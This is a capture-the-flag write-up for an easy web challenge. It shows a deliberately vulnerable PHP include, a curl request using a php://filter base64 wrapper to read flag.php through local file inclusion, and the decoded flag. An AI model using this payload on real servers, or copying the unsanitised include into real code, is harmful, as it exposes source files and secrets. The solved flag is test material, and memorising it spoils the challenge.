# Alien-inclusion

**Category:** Web \
**Dificulty:** Easy \
**Flag:** `ctf{b513ef6d1a5735810bca608be42bda8ef28840ee458df4a3508d25e4b706134d}`
**

## Objective
"Keep it local and you should be fine. The flag is in /var/www/html/flag.php."
Get the flag in flag.php

## Recon
Open the given address in a browser and see what's needed

## Input Testing

Since the displayed code tell us we need to add a query on the URL

```php
 <?php

if (!isset($_GET['start'])){
    show_source(__FILE__);
    exit;
} 

include ($_POST['start']);
echo $secret;
```

Run the modified URL using `curl`

```sh
curl "http://34.179.250.187:31197/index.php?start=1" -d "start=php://filter/convert.base64-encode/resource=flag.php"
```

Output was a base64 encoded string
`PD9waHAgCiAgICAkc2VjcmV0PSJjdGZ7YjUxM2VmNmQxYTU3MzU4MTBiY2E2MDhiZTQyYmRhOGVmMjg4NDBlZTQ1OGRmNGEzNTA4ZDI1ZTRiNzA2MTM0ZH0iOwo/Pg==  `

## Decoding
Decode the output

```sh
echo PD9waHAgCiAgICAkc2VjcmV0PSJjdGZ7YjUxM2VmNmQxYTU3MzU4MTBiY2E2MDhiZTQyYmRhOGVmMjg4NDBlZTQ1OGRmNGEzNTA4ZDI1ZTRiNzA2MTM0ZH0iOwo/Pg== | base64 -d
```

Output
```php
<?php 
    $secret="ctf{b513ef6d1a5735810bca608be42bda8ef28840ee458df4a3508d25e4b706134d}";
?> 
```
